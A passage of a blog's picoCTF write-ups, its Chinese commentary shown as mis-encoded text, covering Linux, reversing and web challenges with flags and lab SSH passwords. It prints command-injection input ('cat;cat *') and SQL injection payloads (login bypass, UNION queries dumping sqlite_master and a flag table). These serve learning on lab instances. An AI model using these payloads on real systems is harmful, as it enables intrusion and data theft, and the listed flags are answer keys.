<p>picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f}</p>
</blockquote>
<h3 id="Permissions"><a href="#Permissions" class="headerlink" title="Permissions"></a>Permissions</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
ssh -p 53849 picoplayer@saturn.picoctf.net
Password: x+T6aPgE4-
Can you login and read the root file?    
</code></pre>
<p><img src="https://hackmd.io/_uploads/B1xxDTeI2.png"></p>
<blockquote>
<p>picoCTF{uS1ng_v1m_3dit0r_f6ad392b}</p>
</blockquote>
<p>æ°´çˆ›</p>
<h3 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
How to automate tasks to run at intervals on linux servers?
Use ssh to connect to this server:
Server: saturn.picoctf.net
Port: 50602
Username: picoplayer 
Password: tPmsUpiHeZ
</code></pre>
<p><img src="https://hackmd.io/_uploads/ByLMuagIn.png"></p>
<blockquote>
<p>picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71}</p>
</blockquote>
<p>?</p>
<h3 id="useless"><a href="#useless" class="headerlink" title="useless"></a>useless</h3><pre><code>AUTHOR: LOIC SHEMA

Description
There&#39;s an interesting script in the user&#39;s home directory
Additional details will be available after launching your challenge instance.
</code></pre>
<p><img src="https://hackmd.io/_uploads/HkhIYaeIn.png"></p>
<blockquote>
<p>picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173}</p>
</blockquote>
<h3 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h3><pre><code>AUTHOR: LT &#39;SYREAL&#39; JONES

Description
Don&#39;t power users get tired of making spelling mistakes in the shell? Not
anymore! Enter Special, the Spell Checked Interface for Affecting Linux.
Now, every word is properly spelled and capitalized... automatically and 
behind-the-scenes! Be the first to test Special in beta, and feel free to
tell us all about how Special streamlines every development process that
you face. When your co-workers see your amazing shell interface, just
tell them: That&#39;s Special (TM)
Start your instance to see connection details.
Additional details will be available after launching your challenge
instance.
</code></pre>
<p>é€™é¡Œæœƒä¸€ç›´æŠŠè¼¸å…¥çš„æŒ‡ä»¤è®Šæˆå¾ˆç°¡å–®çš„å–®å­—ï¼Œç„¶å¾ŒæŠŠé–‹é ­ç”¨æˆå¤§å¯«<br><code>ls</code>æœƒè®Š<code>Is</code><br><code>cat</code>æœƒè®Š<code>Cat</code>ï¼Œä½†å¦‚æœä¸æ˜¯ç¬¬ä¸€å€‹å­—æ¯å°±ä¸æœƒè®Šå¤§å¯«ï¼Œæ‰€ä»¥å¯ä»¥ç”¨catæŒ‡ä»¤<br>ç”¨<code>;</code> æ­é…Regex Command Injection</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat;cat *</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SJMKTpxLh.png"><br>ç™¼ç¾ç›®éŒ„ä¸‹é¢æœ‰ä¸€å€‹è³‡æ–™å¤¾<code>blargh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat;cat blargh/*</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SyasaagIn.png"></p>
<blockquote>
<p>picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59}</p>
</blockquote>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Try reversing this file? Can ya?
I forgot the password to this file. Please find it for me?
</code></pre>
<p>é¡Œç›®çµ¦äº†ä¸€å€‹æª”æ¡ˆ<code>ret</code>ï¼ŒåŸ·è¡Œå¾Œè¦è¼¸å¯†ç¢¼<br><img src="https://hackmd.io/_uploads/H1IQkCgU2.png"></p>
<p>ä¸ŸGDB</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start </span><br><span class="line">c</span><br><span class="line">ctrl^C</span><br><span class="line">niåˆ°æ­»</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SJHUe0eL3.png"><br>åœ¨å‘¼å«strcmpæ¯”å°å¯†ç¢¼æ™‚æŠŠ<code>rsi</code> dumpå‡ºä¾†ï¼Œå¾—åˆ°å‰åŠæˆªflag</p>
<blockquote>
<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528</p>
</blockquote>
<p>é‡æ–°åŸ·è¡Œ<code>ret</code>ï¼Œè¼¸å…¥å¯†ç¢¼<br><img src="https://hackmd.io/_uploads/HJwZb0l83.png"></p>
<blockquote>
<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289}</p>
</blockquote>
<h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Can you find the flag on this website.
Additional details will be available after launching your challenge instance.
</code></pre>
<h4 id="Bypass-login"><a href="#Bypass-login" class="headerlink" title="Bypass login"></a>Bypass login</h4><p>é€²å…¥ç¶²é ï¼Œç¶“å…¸ç™»å…¥ä»‹é¢<br><img src="https://hackmd.io/_uploads/SkQs-CeL3.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span></span><br><span class="line">password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HJnefAeU2.png"><br>é¡Œç›®å¾ˆè²¼å¿ƒæŠŠ<code>query</code>éƒ½printå‡ºä¾†çµ¦ä½ </p>
<p>èª¿æ•´ä¸€ä¸‹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span></span><br><span class="line">password<span class="operator">=</span><span class="string">&#x27; or 1=1;--</span></span><br></pre></td></tr></table></figure>

<p>é€²å…¥ä¹‹å¾Œæœ‰ä¸€å€‹æœå°‹é é¢<br><img src="https://hackmd.io/_uploads/SkTYRu-Uh.png"></p>
<h4 id="æ¸¬è©¦æœ‰å¹¾å€‹æ¬„ä½"><a href="#æ¸¬è©¦æœ‰å¹¾å€‹æ¬„ä½" class="headerlink" title="æ¸¬è©¦æœ‰å¹¾å€‹æ¬„ä½"></a>æ¸¬è©¦æœ‰å¹¾å€‹æ¬„ä½</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchInput<span class="operator">=</span><span class="string">&#x27; union select 1,2,3;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ByxzS0uW83.png"></p>
<h4 id="dump-Table"><a href="#dump-Table" class="headerlink" title="dump Table"></a>dump Table</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchInput<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJwUJt-Ln.png"><br>æ²’çœ‹åˆ°<code>flag</code>ï¼Œå¯èƒ½åœ¨åˆ¥çš„<code>table</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select group_concat(sql),2,3 from sqlite_master WHERE type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27;;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SkJ-xt-83.png"></p>
<p>ç¾åœ¨çŸ¥é“<code>flag</code>æ‡‰è©²åœ¨<code>more_table</code>çš„<code>flag_TEXT</code>æ¬„ä½</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select flag,2,3 from more_table;--</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B16UGtZ82.png"></p>
<blockquote>
<p>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p>
</blockquote>
<h3 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h3><pre><code>AUTHOR: SUNDAY JACOB NWANYIM

Description
How about trying to match a regular expression
Additional details will be available after launching your challenge instance.
</code></pre>
<p>ä¸€é–‹å§‹æ²’çœ‹hintä¸çŸ¥é“åˆ°åº•è¦å¹¹å˜›<br><img src="https://hackmd.io/_uploads/rk36rFZ8h.png"></p>
<p>çµæœæ˜¯è¦match<code>^p.....F!?</code><br><img src="https://hackmd.io/_uploads/SyhyLF-Uh.png"></p>
<p><img src="https://hackmd.io/_uploads/S1jOSFbLn.png"></p>
<blockquote>
<p>picoCTF{succ3ssfully_matchtheregex_9080e406}</p>
</blockquote>
<p>ä¸–ç´€æ°´é¡Œ</p>
<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Help us test the form by submiting the username as test and password as test!
Additional details will be available after launching your challenge instance.
</code></pre>
<p>å…ˆç”¨<code>test</code> <code>test!</code>ç™»å…¥<br><img src="https://hackmd.io/_uploads/S1Q0_t-U2.png"></p>
<p>é€²å»å¾Œä»–èªª<em>I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)</em><br><img src="https://hackmd.io/_uploads/SyiWKKbU3.png"></p>
<h4 id="ç”¨BurpSuiteæŸ¥çœ‹è¢«redirectedçš„é é¢"><a href="#ç”¨BurpSuiteæŸ¥çœ‹è¢«redirectedçš„é é¢" class="headerlink" title="ç”¨BurpSuiteæŸ¥çœ‹è¢«redirectedçš„é é¢"></a>ç”¨<code>BurpSuite</code>æŸ¥çœ‹è¢«redirectedçš„é é¢</h4><p><img src="https://hackmd.io/_uploads/SkjKtK-L2.png"><br>idçœ‹èµ·ä¾†å¾ˆåƒç¶“å…¸base64</p>
<p><img src="https://hackmd.io/_uploads/ryteqKbUh.png"><br><img src="https://hackmd.io/_uploads/HJZycFWLh.png"></p>
<blockquote>
<p>picoCTF{proxies_all_the_way_be716d8e}</p>
</blockquote>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://avatars.githubusercontent.com/u/46417323" alt="TriangleSnake"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">TriangleSnake</p><p class="is-size-6 is-block">National Cheng Kung University</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†é¡</p><a href="/categories"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ¨™ç±¤</p><a href="/tags"><p class="title">12</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/TriangleSnake" target="_blank" rel="me noopener">è¿½è¹¤</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/TriangleSnake"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">åˆ†é¡</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">6</span></span></a><ul><li><a class="level is-mobile" href="/categories/CTF/Cheatsheet/"><span class="level-start"><span class="level-item">Cheatsheet</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF/Writeup/"><span class="level-start"><span class="level-item">Writeup</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li><li><a class="level is-mobile" href="/categories/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Cyber-Security/"><span class="level-start"><span class="level-item">Cyber Security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Others/"><span class="level-start"><span class="level-item">Others</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-30T18:02:43.000Z">2024-10-31</time></p><p class="title"><a href="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/">One Million ASUS Routers Under Control: Exploiting ASUS DDNS to MITM Admin Credentials</a></p><p class="categories"><a href="/categories/Cyber-Security/">Cyber Security</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-08-08T08:32:52.000Z">2024-08-08</time></p><p class="title"><a href="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/">CVE-2024-4577 PHP CGIæ¼æ´è¤‡ç¾åŠç ”ç©¶</a></p><p class="categories"><a href="/categories/CVE/">CVE</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-06-30T06:04:15.000Z">2024-06-30</time></p><p class="title"><a href="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/">2024 AIS3 pre-exam &amp; MFCTF writeup</a></p><p class="categories"><a href="/categories/CTF/">CTF</a> / <a href="/categories/CTF/Writeup/">Writeup</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-05-14T07:44:07.000Z">2024-05-14</time></p><p class="title"><a href="/2024/05/14/%E5%A6%82%E4%BD%95%E5%B9%AB-Proxmox-VM-%E6%93%B4%E5%85%85%E7%A3%81%E7%A2%9F%E5%A4%A7%E5%B0%8F/">å¦‚ä½•ä½¿ç”¨Partedå¹« Proxmox VM æ“´å……ç£ç¢Ÿå¤§å°</a></p><p class="categories"><a href="/categories/Others/">Others</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-04-30T07:11:21.000Z">2024-04-30</time></p><p class="title"><a href="/2024/04/30/CTF-Cheatsheet-Web/">CTF Cheatsheet - Web</a></p><p class="categories"><a href="/categories/CTF/">CTF</a> / <a href="/categories/CTF/Cheatsheet/">Cheatsheet</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">å½™æ•´</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">åæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">å…«æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">å…­æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/04/"><span class="level-start"><span class="level-item">å››æœˆ 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">äºŒæœˆ 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">åäºŒæœˆ 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">æ¨™ç±¤</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQLi/"><span class="tag">SQLi</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/argument-injection/"><span class="tag">argument injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command-injection/"><span class="tag">command injection</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/misc/"><span class="tag">misc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxmox/"><span class="tag">proxmox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeup/"><span class="tag">writeup</span><span class="tag">5</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/triblog.svg" alt="TriangeSnake&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 TriangleSnake</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">Â© 2024</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-tw");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é é¦–" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="è«‹è¼¸å…¥é—œéµå­—..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"è«‹è¼¸å…¥é—œéµå­—...","untitled":"(ç„¡æ¨™é¡Œ)","posts":"æ–‡ç« ","pages":"é é¢","categories":"åˆ†é¡","tags":"æ¨™ç±¤"});
        });</script></body></html>